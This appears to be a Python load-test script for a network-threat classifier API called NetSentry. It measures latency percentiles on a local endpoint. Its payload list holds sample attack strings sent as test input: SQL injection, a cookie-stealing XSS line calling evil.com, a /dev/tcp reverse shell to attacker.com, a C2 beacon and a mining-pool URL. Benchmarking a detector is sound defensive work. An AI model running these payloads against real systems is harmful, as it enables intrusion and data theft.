#!/usr/bin/env python3
"""
NetSentry — Load test harness.

Fires concurrent POST /api/classify requests at increasing load levels,
records per-request latency, and writes results/latency.json which
plot_latency.py then renders.

This produces REAL measured numbers for your BENCHMARKS.md. Run it against
a local API (node api/server.js) for best results — cloud free tiers add
network noise that inflates the tail.

Usage:
    # 1. start the API locally
    cd api && npm start

    # 2. in another terminal
    pip install aiohttp numpy
    python benchmark/load_test.py --url http://localhost:3001

Output:
    benchmark/results/latency.json
"""
import argparse
import asyncio
import json
import os
import time

import numpy as np

try:
    import aiohttp
except ImportError:
    raise SystemExit("pip install aiohttp numpy  (required for load testing)")

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = os.path.join(HERE, "results")

# Mixed payload set — same distribution a real edge would see
PAYLOADS = [
    "' UNION SELECT username, password FROM users--",
    "<script>document.location='https://evil.com/c='+document.cookie</script>",
    "ping 8.8.8.8; /bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1",
    "GET /gate.php?id=infected_host HTTP/1.1\r\nHost: c2.malware.ru",
    "base64:H4sIAAAAAAAAA6tWKkktLlGyUlIqS8wpTgU.gzip.tunnel.attacker.xyz",
    "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0",
    "nmap -sS -p 22,80,443 192.168.1.0/24 --open",
    "stratum+tcp://xmr.pool.minergate.com:45700",
]

LOAD_LEVELS = [1000, 5000, 10000, 25000, 50000, 100000]  # requests per level
DURATION_HINT_S = 6  # soft cap per level


async def fire(session, url, payload, sem, samples):
    async with sem:
        body = {"payload": payload, "src_ip": "185.220.101.34", "dst_port": 80}
        t0 = time.perf_counter()
        try:
            async with session.post(f"{url}/api/classify", json=body) as r:
                await r.read()
                dt_us = (time.perf_counter() - t0) * 1e6
                samples.append(dt_us)
        except Exception:
            pass  # dropped request — excluded from latency stats


async def run_level(url, n_requests, concurrency):
    sem = asyncio.Semaphore(concurrency)
    samples = []
    timeout = aiohttp.ClientTimeout(total=10)
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [
            fire(session, url, PAYLOADS[i % len(PAYLOADS)], sem, samples)
            for i in range(n_requests)
        ]
        t0 = time.perf_counter()
        await asyncio.gather(*tasks)
        wall = time.perf_counter() - t0

    if not samples:
        return None
    arr = np.array(samples)
    return {
        "ok": len(samples),
        "sent": n_requests,
        "wall_s": round(wall, 2),
        "rps_actual": round(len(samples) / wall, 0),
        "p50": round(float(np.percentile(arr, 50)), 1),
        "p95": round(float(np.percentile(arr, 95)), 1),
        "p99": round(float(np.percentile(arr, 99)), 1),
    }


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:3001",
                    help="API base URL (default http://localhost:3001)")
    ap.add_argument("--concurrency", type=int, default=200,
                    help="Max in-flight requests (default 200)")
    args = ap.parse_args()

    print(f"NetSentry load test → {args.url}\n")
    loads, p50s, p95s, p99s = [], [], [], []

    for n in LOAD_LEVELS:
        print(f"  level {n:>7,} req ... ", end="", flush=True)
        res = await run_level(args.url, n, args.concurrency)
        if res is None:
            print("no successful responses (is the API running?)")
            continue
        loads.append(n)
        p50s.append(res["p50"]); p95s.append(res["p95"]); p99s.append(res["p99"])
        print(f"p50={res['p50']:>6}µs  p95={res['p95']:>6}µs  "
              f"p99={res['p99']:>6}µs  ({res['rps_actual']:.0f} rps)")

    os.makedirs(OUT_DIR, exist_ok=True)
    out = os.path.join(OUT_DIR, "latency.json")
    with open(out, "w") as f:
        json.dump({"loads": loads, "p50": p50s, "p95": p95s, "p99": p99s}, f, indent=2)
    print(f"\nSaved {out}")
    print("Now run:  python benchmark/plot_latency.py")


if __name__ == "__main__":
    asyncio.run(main())